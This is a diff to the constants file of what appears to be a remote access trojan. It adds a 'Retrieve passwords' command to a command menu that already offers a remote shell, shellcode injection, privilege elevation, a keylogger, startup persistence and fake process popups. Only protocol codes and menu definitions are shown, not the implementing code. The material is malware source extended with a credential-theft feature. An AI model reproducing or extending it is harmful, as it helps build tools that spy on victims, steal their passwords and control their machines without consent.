@@ -42,6 +42,7 @@ CLIENT_UPLOAD_FILE_PATH = 30
 CLIENT_SHELLCODE = 31
 CLIENT_ELEVATE = 32
 SERVER_ELEVATE_RSP = 33
+CLIENT_PWD = 34
 
 # all menu arguments must be a single char
 MENU_HELP = "H"
@@ -76,6 +77,7 @@ MENU_INTERACT_BACKGROUND = "B"
 MENU_INTERACT_CLOSE = "C"
 MENU_INTERACT_SHELLCODE = "J"
 MENU_INTERACT_ELEVATE = "V"
+MENU_INTERACT_PWD = "U"
 
 # arg2 commands
 MENU_INTERACT_KEYLOG_START = "start"
@@ -87,6 +89,8 @@ MENU_INTERACT_STARTUP_RMV = "rmv"
 
 MENU_INTERACT_DISABLE_PROCESS_POPUP = "fake_popup"
 
+MENU_INTERACT_PWD_PASS = "password"
+
 SERVER_INTERACT_COMMAND_LIST = [{"arg": MENU_HELP, "info": "Help"},
                                 {"arg": MENU_INTERACT_SHELL, "info": "Open remote shell"},
                                 {"arg": MENU_INTERACT_PYTHON, "info": "Open python interpreter"},
@@ -95,6 +99,7 @@ SERVER_INTERACT_COMMAND_LIST = [{"arg": MENU_HELP, "info": "Help"},
                                  "platform": "windows"},
                                 {"arg": MENU_INTERACT_SHELLCODE, "info": "Inject shellcode", "platform": "windows"},
                                 {"arg": MENU_INTERACT_ELEVATE, "info": "Attempt to launch as admin", "platform": "windows"},
+                                {"arg": MENU_INTERACT_PWD, "info": "Retrieve passwords", "optional_arg2": "password"},
                                 {"arg": MENU_INTERACT_KEYLOG, "info": "Keylogger",
                                  "arg2": f"({MENU_INTERACT_KEYLOG_START}) ({MENU_INTERACT_KEYLOG_STOP}) ({MENU_INTERACT_KEYLOG_DUMP})"},
                                 {"arg": MENU_INTERACT_RECV, "info": "Receive file"},
